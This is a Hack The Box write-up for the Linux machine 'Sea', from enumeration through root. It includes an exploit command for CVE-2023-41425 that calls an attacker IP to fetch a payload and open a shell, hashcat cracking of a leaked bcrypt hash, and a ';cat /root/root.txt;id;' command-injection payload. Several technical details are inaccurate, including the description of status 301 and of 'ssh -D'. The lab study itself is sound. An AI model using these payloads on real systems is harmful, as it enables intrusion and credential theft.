Sea is an Easy-rated Linux machine on Hack The Box that requires thorough web enumeration to uncover hidden directories and identify a vulnerable theme. Exploiting CVE-2023-41425 allows for remote code execution, leading to an initial foothold. A hashed password found in a database file is cracked to gain SSH access as a user. Privilege escalation is achieved by tunneling into a locally hosted service, leveraging access logs to execute commands as root.

## Enumeration
- * **IP:** 10.10.11.28
- * **Environment:** Linux

### Port Scan
To begin, I conducted an initial enumeration using *Nmap*:

```bash
sudo nmap -sS -sV -sC -p22,80 -Pn -n -vvv 10.129.109.135 -oA nmap/allPorts
```

```bash 
# Nmap 7.94SVN scan initiated Tue Aug 13 14:42:56 2024 as: nmap -sS -sV -sC -p22,80 -Pn -n -vvv -oA nmap/allPorts 10.129.109.135
Nmap scan report for 10.129.109.135

```

The scan revealed two open ports:

- **22/tcp** 
- **80/tcp**

#### Host Discovery
Visiting the web page on port 80 revealed a hostname in a redirect link: `sea.htb`. This was added to `/etc/hosts`:

![Alt Text](/assets/images/HTB/Sea/sea1.png)

```plaintext
10.10.11.28  sea.htb
```


### Fuzzing the target
#### Identifying folders
I began fuzzing the web server to identify directories using *ffuf*. After getting results, I was able to identify some directories that were returning a status code of 301 (forbidden).

```bash
ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://sea.htb/FUZZ -c -fc 403
```

![Alt Text](/assets/images/HTB/Sea/sea2.png)

## Foothold

### Targeted fuzzing
I tried to uncover hidden content by looking for files/folders *within specific folders*. The idea was to fuzz deeper into the directory structure, targeting areas that might not have the same level of protection or redirection rules. By isolating and testing these subdirectories.
In this case, I focused on the **themes** directory:

```bash
ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://sea.htb/themes/FUZZ -c
```
![Alt Text](/assets/images/HTB/Sea/sea3.png)

After reviewing these results, the folder *bike* was the one that caught my attention, even though it was giving a 301 status. I decided to keep enumerating, fuzzing, and digging deeper for more information.

![Alt Text](/assets/images/HTB/Sea/sea4.png)


Within `/themes/bike/`, I discovered a file called *version*. Accessing it revealed the software *Version: **3.2.0***.

- http://sea.htb/themes/bike/version

![Alt Text](/assets/images/HTB/Sea/sea5.png)

 Further exploration led to `README.md`, which provided details about the software used by the site: **WonderCMS**.

### Vulnerability Discovery
Researching the identified software version uncovered a critical vulnerability:

- **CVE-2023-41425** - *WonderCMS* Cross-Site Scripting (XSS) leading to Remote Code Execution (RCE)

This vulnerability affects **WonderCMS** versions **3.2.0 through 3.4.2**. The vulnerability lies in the `installModule` component of WonderCMS, where user inputs are not adequately sanitized before being processed.

For the exploit to work, the attacker must either be authenticated or trick an authenticated user into executing the malicious code. In this case, the machine uses a bot that automatically triggers the action.

## Exploitation

Using a Python 3 exploit script from [GitHub](https://github.com/insomnia-jacob/CVE-2023-41425), the script required specifying the URL, attacker IP, attacker port, and the path to the payload zip file:

```bash
python3 exploit.py -u http://sea.htb/loginURL -i 10.10.14.4 -p 1234 -r http://10.10.14.4/main.zip
```

Once the payload was prepared, I used the website's contact form to deliver the malicious link to the admin, triggering the exploit.

## Privilege Escalation (Amay)

### Discovering the hash
With a shell as `www-data`, I enumerated the filesystem and discovered a database file at `/var/www/sea/data`, containing a hashed password:


![Alt Text](/assets/images/HTB/Sea/sea9.png)

```plaintext
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
```
### Cracking the hash
Using Hashcat, I cracked the hash with the following command:

```bash
hashcat -m 3200 DB.hash /usr/share/wordlists/rockyou.txt --force
```
![Alt Text](/assets/images/HTB/Sea/sea10.png)

The password was successfully recovered. Using this credential, I logged in as the user **amay** via SSH.

```bash
ssh amay@10.129.109.135
```
![Alt Text](/assets/images/HTB/Sea/sea11.png)



## Privilege Escalation (Root)

### Local Service Discovery
As `amay`, I identified a service running on localhost at port 8080:

```bash
netstat -tunlp
```

To access it, I established local port forwarding:

```bash
ssh -D 8080  amay@10.129.109.135
```

Navigating to http://localhost:8080, I found a dashboard requiring credentials. The credentials for `amay` worked, granting access to the dashboard.

![Alt Text](/assets/images/HTB/Sea/sea12.png)

### Log File Exploitation
![Alt Text](/assets/images/HTB/Sea/sea13.png)

The dashboard provided access to logs, including *access.log* and *auth.log*.

![Alt Text](/assets/images/HTB/Sea/sea14.png)

By intercepting the request in Burp Suite, I injected a malicious command to read the `root.txt` flag:

```plaintext
;cat /root/root.txt;id;
```

Upon execution, I successfully retrieved the root flag and verified root access.

## Conclusion

This machine provided a comprehensive lesson in enumeration, vulnerability exploitation, and privilege escalation. Key takeaways include:

1. **Thorough Enumeration**: Always examine HTTP responses, directories, and server headers for clues.
2. **Research Known Vulnerabilities**: Identifying software versions and matching them to CVEs can expedite exploitation.
3. **Creative Exploitation**: Leveraging user interaction and local services is critical for advancing in restricted environments.

Happy hacking! Stay tuned for more write-ups.
